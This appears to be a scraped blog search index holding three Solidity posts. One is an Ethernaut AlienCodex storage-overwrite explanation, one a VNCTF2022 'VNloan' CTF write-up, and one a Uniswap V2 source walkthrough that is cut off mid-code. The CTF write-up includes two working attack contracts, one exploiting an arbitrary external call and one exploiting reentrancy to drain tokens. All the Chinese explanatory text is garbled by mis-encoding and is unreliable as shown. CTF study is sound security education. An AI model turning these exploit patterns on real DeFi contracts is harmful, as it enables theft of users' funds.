MIT\npragma solidity ^0.5.0;\n\nimport '../helpers/Ownable-05.sol';\n\ncontract AlienCodex is Ownable &#123;\n\n  bool public contact;\n  bytes32[] public codex;\n\n  modifier contacted() &#123;\n    assert(contact);\n    _;\n  &#125;\n  \n  function make_contact() public &#123;\n    contact = true;\n  &#125;\n\n  function record(bytes32 _content) contacted public &#123;\n  \tcodex.push(_content);\n  &#125;\n\n  function retract() contacted public &#123;\n    codex.length--;\n  &#125;\n\n  function revise(uint i, bytes32 _content) contacted public &#123;\n    codex[i] = _content;\n  &#125;\n&#125;\n\nåˆ†æžï¼šæ•°ç»„é•¿åº¦å¯ä»¥é€šè¿‡retractå‡½æ•°ä¸‹æº¢å¤„è¾¾åˆ°2^256ï¼Œæ­¤æ—¶codex.lengthä¸º2**256-1ï¼Œmap[x]çš„å­˜å‚¨åœ°å€ä¸ºkeccak256(slot(codex)),æ­¤å¤„slot(map)ä¸º1ï¼Œmap[x]å­˜å‚¨åœ°å€ä¸ºkeccak256(slot(codex))+x,æ‰€ä»¥æž„é€ xä¸º 2^256-keccak256(1)ï¼Œpayloadä¸ºä»»æ„åœ°å€å³å¯è¦†ç›–Ownable-05.solä¸­çš„ownerå˜é‡ï¼ˆownerå’Œcontactéƒ½å­˜å‚¨åœ¨slot0ï¼‰\nç›¸åº”ä¾‹é¢˜ï¼š\nEthernautâ€”â€”Alien Codex \nhttps://ethernaut.openzeppelin.com/level/0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272\n","slug":"Smart Contract Basic Vulnerability Summary","date":"2022-08-01T10:46:51.248Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"f5b9fca07821fa4050ef59953395a72d","title":"VNCTF2022 open tournament-> Blockchain-VNloan","content":"0x00 èƒŒæ™¯åŸºäºŽ Uniswap V3 çš„ DeFi æµåŠ¨æ€§åè®®Visor Financeé­å—é»‘å®¢æ”»å‡»ï¼Œé»‘å®¢åˆ©ç”¨é‡å…¥æ¼æ´žè€—å°½äº†880ä¸‡æžšVISRä»£å¸ï¼Œå½“æ—¶ï¼ŒVISRçš„äº¤æ˜“ä»·æ ¼çº¦ä¸º0.93ç¾Žå…ƒï¼Œæ€»æŸå¤±çº¦ä¸º820ä¸‡ç¾Žå…ƒã€‚\nå› ä¸ºcallè°ƒç”¨äº§ç”Ÿçš„æ¼æ´žè¿˜æ˜¯æ¯”è¾ƒå¤šçš„ï¼Œæ¯”å¦‚é‡å…¥æ¼æ´žï¼Œatnä»£å¸å¢žå‘äº‹ä»¶ç­‰ã€‚\n \n\n0x01 VNloané¢˜ç›®é“¾æŽ¥ï¼šhttps://buuoj.cn/match/matches/81/challenges\nè§£å‡ºå¯†ç èŽ·å¾—é¢˜ç›®åˆçº¦\n\nSetup.sol\npragma solidity 0.4.26;\nimport \"./VNETH.sol\";\ncontract Setup&#123;\n    VNETH public vneth;\n    bool public Solved=false;\n    constructor()public payable&#123;\n        vneth=new VNETH();\n    &#125;\n    function checksuccess()public&#123;\n        if(vneth.balanceOf(msg.sender)>=5000)\n        Solved=true;\n    &#125;\n    function isSolved()public view returns(bool)&#123;\n        if(Solved==true)&#123;\n            return true;\n        &#125;\n        return false;\n    &#125;\n&#125;\n\nVNETH.sol\npragma solidity 0.4.26;\n\ncontract VNETH &#123;\n    address public owner;\n    string public name     = \"VN ETHER\";\n    string public symbol   = \"VNeth\";\n    uint8  public decimals = 18;\n    bool  public isLoan=false;\n    event  Approval(address indexed src, address indexed guy, uint wad);\n    event  Transfer(address indexed src, address indexed dst, uint wad);\n    event  Deposit(address indexed dst, uint wad);\n    event  Withdrawal(address indexed src, uint wad);\n\n    mapping (address => uint)                       public  balanceOf;\n    mapping (address => mapping (address => uint))  public  allowance;\n    constructor()public&#123;\n        owner=msg.sender;\n        balanceOf[owner]=1e18 ether;\n        balanceOf[address(this)]=1e18 ether;\n    &#125;\n    function() external payable &#123;\n        deposit();\n    &#125;\n    function deposit() public payable &#123;\n        balanceOf[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    &#125;\n    function withdraw(uint wad) public &#123;\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        (msg.sender).transfer(wad);\n        emit Withdrawal(msg.sender, wad);\n    &#125;\n\n    function totalSupply() public view returns (uint) &#123;\n        return address(this).balance;\n    &#125;\n\n    function approve(address guy, uint wad) public returns (bool) &#123;\n        allowance[msg.sender][guy] = wad;\n        emit Approval(msg.sender, guy, wad);\n        return true;\n    &#125;\n\n    function transfer(address dst, uint wad) public returns (bool) &#123;\n        return transferFrom(msg.sender, dst, wad);\n    &#125;\n\n    function fakeflashloan(uint256 value,address target,bytes memory data) public&#123;\n        require(isLoan==false&amp;&amp;value>=0&amp;&amp;value&lt;=1000);\n        balanceOf[address(this)]-=value;\n        balanceOf[target]+=value;\n\n        address(target).call(data);\n\n        isLoan=true;\n        require(balanceOf[target]>=value);\n        balanceOf[address(this)]+=value;\n        balanceOf[target]-=value;\n        isLoan=false;\n    &#125;\n\n    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    &#123;\n        require(balanceOf[src] >= wad);\n\n        if (src != msg.sender &amp;&amp; allowance[src][msg.sender] != 2**256-1) &#123;\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        &#125;\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        emit Transfer(src, dst, wad);\n\n        return true;\n    &#125;\n&#125;\n\n0x03 åˆ†æžæ¼æ´žè§£æ³•ä¸€  callè°ƒç”¨é¦–å…ˆåˆ†æžsetupä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°éœ€è¦æ»¡è¶³è°ƒç”¨è€…çš„ä½™é¢å¤§äºŽç­‰äºŽ5000ï¼Œç¡®å®šä¸‹æ¥æ–¹å‘ç„¶åŽä¸»è¦çœ‹VNETHåˆçº¦ã€‚\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨åˆçº¦æž„é€ è¿‡ç¨‹ä¸­ï¼Œåˆçº¦ownerä»¥åŠåˆçº¦æœ¬èº«æœ‰1^18^*1^18^çš„ä½™é¢ï¼Œæ‰€ä»¥è¦æ˜¯æˆ‘ä»¬çš„æ”»å‡»åˆçº¦ä½™é¢è¾¾åˆ°5000ï¼Œå¯ä»¥ä»Žowneræˆ–åˆçº¦ä¸­è½¬è´¦è¿‡æ¥ã€‚\nè€Œä»Žåˆçº¦ä¸­æƒ³æŒ‡å®šè´¦æˆ·è½¬è´¦éœ€è¦æå‰æŽˆæƒç›¸åº”æ•°é‡çš„ä»£å¸ã€‚\n\næ‰€ä»¥åœ¨msg.senderæ˜¯æ¼æ´žåˆçº¦çš„å‰æä¸‹æŽ§åˆ¶guyä¸ºæ”»å‡»åˆçº¦ï¼Œå³å¯ä¸ºæ”»å‡»åˆçº¦èŽ·å¾—æƒé™\n\næ³¨æ„åˆ°ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ï¼Œå¯ä»¥åœ¨targetçš„çŽ¯å¢ƒä¸‹è°ƒç”¨dataï¼Œè€Œtargetä»¥åŠdataéƒ½æ˜¯å¯æŽ§çš„ï¼Œæ‰€ä»¥æ¼æ´žæ˜¯å‡ºçŽ°åœ¨callè°ƒç”¨å¤„ã€‚\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥æž„é€ dataï¼ˆåŒ…æ‹¬function selctorä»¥åŠå¯¹åº”å‚æ•°ï¼‰ï¼Œdataå¯ä»¥é€šè¿‡è°ƒç”¨approveå‡½æ•°èŽ·å¾—ã€‚\nå†å¯¹fakeflashloanå‡½æ•°è¿›è¡Œè°ƒç”¨ï¼Œä¼ å…¥dataå³å¯è°ƒç”¨æ¼æ´žåˆçº¦ä¸‹çš„approveå‡½æ•°ï¼Œæ­¤æ—¶msg.senderå°†æ˜¯æ¼æ´žåˆçº¦æœ¬èº«ï¼Œæ”»å‡»åˆçº¦å°†ä¼šèŽ·å¾—æ¥è‡ªæ¼æ´žåˆçº¦çš„æŒ‡å®šæ•°é‡çš„ä»£å¸æŽˆæƒã€‚\næŽˆæƒä¹‹åŽåªéœ€è¦è°ƒç”¨transferfromå‡½æ•°ï¼Œå°†å¯¹åº”æ•°é‡çš„ä»£å¸è½¬è´¦åˆ°æ”»å‡»åˆçº¦ä¸­ï¼Œå³å¯æ»¡è¶³è§£é¢˜æ¡ä»¶ã€‚\npocå¦‚ä¸‹\ncontract attack&#123;\n    VNETH target = VNETH(0xe67f9c7880049BD323cc73D13Bed19c16dfC27F5);\n    Setup target1=Setup(0xb27A31f1b0AF2946B7F582768f03239b1eC07c2c);\n    function approve(address guy, uint wad)public&#123;\n        target.approve(guy,wad);\n    &#125;\n    function getallowance(uint256 value,address t,bytes memory data)public&#123;\n        target.fakeflashloan(value,t,data);\n    &#125;\n    function getmoney(address src, address dst, uint wad)public&#123;\n        target.transferFrom(src,dst,wad);\n    &#125;\n    function success() public&#123;\n        target1.checksuccess();\n    &#125;\n&#125;\n\næŒ‰ç…§åˆ†æžè¿‡ç¨‹è°ƒç”¨å¯¹åº”å‡½æ•°å¹¶ä¼ å…¥ç›¸åº”çš„å‚æ•°å³å¯ã€‚\n\nè§£æ³•äºŒ  é‡å…¥\n\nåˆ†æžåˆçº¦ä»£ç å¯ä»¥å‘çŽ°è¯¥å¤„å­˜åœ¨é‡å…¥æ¼æ´žï¼Œè€Œåœ¨fakeflashloanå‡½æ•°ä¸­dataå¯æŽ§ï¼Œå¹¶ä¸”å¯¹äºŽisLoanå˜é‡çš„ä¿®æ”¹æ”¾åœ¨callä¹‹åŽï¼Œå¯ä»¥é€ æˆé‡å…¥ã€‚\næ‰€ä»¥åœ¨æ”»å‡»åˆçº¦ä¸­è°ƒç”¨ä¸€æ¬¡fakeflashloanå‡½æ•°ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªdataï¼ˆbytes4ç±»åž‹ï¼Œåšselectorï¼‰å³å¯è§¦å‘é‡å…¥ï¼Œæ”»å‡»åˆçº¦ä¸­çš„fallbackå‡½æ•°å†…å®¹ä¸ºè°ƒç”¨4æ¬¡fakeflashloanå‡½æ•°ï¼ˆvalueæ˜¯1000çš„æƒ…å†µä¸‹ï¼‰ï¼Œæ­¤æ—¶æ€»å…±è°ƒç”¨äº†äº”æ¬¡ï¼Œä½™é¢è¾¾åˆ°è¦æ±‚ã€‚\nä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè°ƒç”¨setupåˆçº¦ä¸­çš„checksuccesså‡½æ•°æ—¶ï¼Œè¦ç”±æ”»å‡»åˆçº¦ä¸­çš„fallbackå‡½æ•°åˆ¤æ–­è¾¾åˆ°æ¡ä»¶åŽè¿›è¡Œè°ƒç”¨ï¼Œå…·ä½“åŽŸå› æ”¾åœ¨pocä¹‹åŽ\npocå¦‚ä¸‹\ncontract attack&#123;\n    VNETH target = VNETH(0x4b0d7A551c9371AEfC004Ae1a9F184aCD39B89C6);\n    Setup target1=Setup(0x9d83e140330758a8fFD07F8Bd73e86ebcA8a5692);\n    bytes data = '0xabcdabcd';\n    uint i;\n    function reen()payable public&#123;\n        target.fakeflashloan(1000,address(this),data);\n    &#125;\n    function() external payable&#123;\n      while(i&lt;4)&#123;\n         i++;\n         target.fakeflashloan(1000,address(this),data);\n     &#125;\n    if(i==4)&#123;\n         target1.checksuccess();\n        &#125;\n    &#125;\n&#125;\n\nå› ä¸ºåœ¨è¿›è¡Œcallè°ƒç”¨æ—¶ï¼Œæ˜¯ä¸€æ¬¡callä¸­åµŒå¥—ç€å¦ä¸€æ¬¡callï¼Œæ€»å…±äº”æ¬¡ã€‚è€Œåœ¨æœ€åŽä¸€æ¬¡å‡ºå‘æ”»å‡»åˆçº¦ä¸­çš„fallbackå‡½æ•°æ—¶å·²ç»ä¸æ»¡è¶³i&lt;4çš„æ¡ä»¶ã€‚\ncallè°ƒç”¨çš„ç‰¹ç‚¹æ˜¯åªè¿”å›žtrueæˆ–falseä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæ‰€ä»¥ä»–ä¼šæ‰§è¡ŒåŽç»­ä»£ç ï¼Œä¹Ÿå°±æ˜¯ç›¸æœºæ‰§è¡Œå®Œäº”æ¬¡åµŒå¥—ä¸­çš„åŽç»­ä»£ç ï¼Œæ”»å‡»åˆçº¦ä¸­çš„ä½™é¢å°†è¢«å½’é›¶ï¼Œæ‰€ä»¥è¦æŒ‰ç…§pocä¸­çš„æ–¹æ³•è¿›è¡Œæ”»å‡»å³å¯ã€‚\n\n0x04  æ€»ç»“callå‡½æ•°çµæ´»æ€§æžé«˜ï¼Œåˆçº¦åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨äº†å±é™©çš„å‡½æ•°ï¼Œå¹¶ä¸”ä½¿ç”¨ä¸å®‰å…¨çš„äº¤äº’æ¨¡å¼ï¼Œæ­£æ˜¯ç”±äºŽè¿™ç§çµæ´»æ€§æžé«˜çš„å‡½æ•°çš„æ»¥ç”¨é€ æˆäº†å„ç§æ¼æ´žã€‚\nåœ¨æ­¤ç»™å¼€å‘è€…æå‡ºä»¥ä¸‹å»ºè®®ï¼š\n\nåœ¨åˆçº¦å¼€å‘è¿‡ç¨‹ä¸­ä¸€å®šè¦è°¨æ…Žçš„ä½¿ç”¨æ­¤ç±»å‡½æ•°\nå¹¶ä¸”åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œå¯¹è°ƒç”¨çš„åˆçº¦åœ°å€ï¼Œå¯è°ƒç”¨çš„å‡½æ•°è¿›è¡Œä¸¥æ ¼é™åˆ¶\næ™ºèƒ½åˆçº¦åœ¨éƒ¨ç½²å‰å¿…é¡»ç»è¿‡ä¸¥æ ¼çš„å®¡è®¡ä»¥åŠæµ‹è¯•ã€‚\n\n","slug":"VNCTF2022 Blockchain-VNloan","date":"2022-08-01T10:45:15.790Z","categories_index":"","tags_index":"åŒºå—é“¾ ctf","author_index":"bcYng"},{"id":"e27183e0e340d83abbd9dfc8e53b323b","title":"Analysis of uniswapV2","content":"\n\n\nç›¸å¯¹ç³»ç»Ÿä¸”æ·±å…¥çš„äº†è§£äº†ä¸€ä¸‹uniswapV2\nwhitepaperï¼š\nhttps://uniswap.org/whitepaper.pdf\nEIP-2612ï¼š\nhttps://github.com/ethereum/EIPs/blob/master/EIPS/eip-2612.md?ref=learnblockchain.cn\nUniswapV2 Factory\nClick to see more\npragma solidity =0.5.16;\n\ninterface IUniswapV2Factory &#123;\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n&#125;\n\ninterface IUniswapV2Pair &#123;\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\n    function factory() external view returns (address);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function kLast() external view returns (uint);\n\n    function mint(address to) external returns (uint liquidity);\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n\n    function initialize(address, address) external;\n&#125;\n\ninterface IUniswapV2ERC20 &#123;\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n&#125;\n\ninterface IERC20 &#123;\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n&#125;\n\ninterface IUniswapV2Callee &#123;\n    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;\n&#125;\n\ncontract UniswapV2ERC20 is IUniswapV2ERC20 &#123;\n    using SafeMath for uint;\n\n    string public constant name = 'Uniswap V2';\n    string public constant symbol = 'UNI-V2';\n    uint8 public constant decimals = 18;\n    uint  public totalSupply;\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n\n    bytes32 public DOMAIN_SEPARATOR;\n    // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n    mapping(address => uint) public nonces;\n\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    constructor() public &#123;\n        uint chainId;\n        assembly &#123;\n            chainId := chainid\n        &#125;\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n                keccak256(bytes(name)),\n                keccak256(bytes('1')),\n                chainId,\n                address(this)\n            )\n        );\n    &#125;\n\n    function _mint(address to, uint value) internal &#123;\n        totalSupply = totalSupply.add(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(address(0), to, value);\n    &#125;\n\n    function _burn(address from, uint value) internal &#123;\n        balanceOf[from] = balanceOf[from].sub(value);\n        totalSupply = totalSupply.sub(value);\n        emit Transfer(from, address(0), value);\n    &#125;\n\n    function _approve(address owner, address spender, uint value) private &#123;\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    &#125;\n\n    function _transfer(address from, address to, uint value) private &#123;\n        balanceOf[from] = balanceOf[from].sub(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(from, to, value);\n    &#125;\n\n    function approve(address spender, uint value) external returns (bool) &#123;\n        _approve(msg.sender, spender, value);\n        return true;\n    &#125;\n\n    function transfer(address to, uint value) external returns (bool) &#123;\n        _transfer(msg.sender, to, value);\n        return true;\n    &#125;\n\n    function transferFrom(address from, address to, uint value) external returns (bool) &#123;\n        if (allowance[from][msg.sender] != uint(-1)) &#123;\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        &#125;\n        _transfer(from, to, value);\n        return true;\n    &#125;\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external &#123;\n        require(deadline >= block.timestamp, 'UniswapV2: EXPIRED');\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                '\\x19\\x01',\n                DOMAIN_SEPARATOR,\n                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(recoveredAddress != address(0) &amp;&amp; recoveredAddress == owner, 'UniswapV2: INVALID_SIGNATURE');\n        _approve(owner, spender, value);\n    &#125;\n&#125;\n\ncontract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 &#123;\n    using SafeMath  for uint;\n    using UQ112x112 for uint224;\n\n    uint public constant MINIMUM_LIQUIDITY = 10**3;\n    bytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));\n\n    address public factory;\n    address public token0;\n    address public token1;\n\n    uint112 private reserve0;           // uses single storage slot, accessible via getReserves\n    uint112 private reserve1;           // uses single storage slot, accessible via getReserves\n    uint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves\n\n    uint public price0CumulativeLast;\n    uint public price1CumulativeLast;\n    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event\n\n    uint private unlocked = 1;\n    modifier lock() &#123;\n        require(unlocked == 1, 'UniswapV2: LOCKED');\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    &#125;\n\n    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) &#123;\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    &#125;\n\n    function _safeTransfer(address token, address to, uint value) private &#123;\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));\n        require(success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))), 'UniswapV2: TRANSFER_FAILED');\n    &#125;\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    constructor() public &#123;\n        factory = msg.sender;\n    &#125;\n\n    // called once by the factory at time of deployment\n    function initialize(address _token0, address _token1) external &#123;\n        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n    &#125;\n\n    // update reserves and, on the first call per block, price accumulators\n    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123;\n        require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), 'UniswapV2: OVERFLOW');\n        uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n        &#125;\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, reserve1);\n    &#125;\n\n    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)\n    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;\n        address feeTo = IUniswapV2Factory(factory).feeTo();\n        feeOn = feeTo != address(0);\n        uint _kLast = kLast; // gas savings\n        if (feeOn) &#123;\n            if (_kLast != 0) &#123;\n                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));\n                uint rootKLast = Math.sqrt(_kLast);\n                if (rootK > rootKLast) &#123;\n                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));\n                    uint denominator = rootK.mul(5).add(rootKLast);\n                    uint liquidity = numerator / denominator;\n                    if (liquidity > 0) _mint(feeTo, liquidity);\n                &#125;\n            &#125;\n        &#125; else if (_kLast != 0) &#123;\n            kLast = 0;\n        &#125;\n    &#125;\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function mint(address to) external lock returns (uint liquidity) &#123;\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) &#123;\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        &#125; else &#123;\n            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n        &#125;\n        require(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    &#125;\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function burn(address to) external lock returns (uint amount0, uint amount1) &#123;\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        address _token0 = token0;                                // gas savings\n        address _token1 = token1;                                // gas savings\n        uint balance0 = IERC20(_token0).balanceOf(address(this));\n        uint balance1 = IERC20(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(amount0 > 0 &amp;&amp; amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    &#125;\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;\n        require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 &amp;&amp; to != _token1, 'UniswapV2: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        &#125;\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');\n        &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');\n        &#125;\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    &#125;\n\n    // force balances to match reserves\n    function skim(address to) external lock &#123;\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));\n        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));\n    &#125;\n\n    // force reserves to match balances\n    function sync() external lock &#123;\n        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n    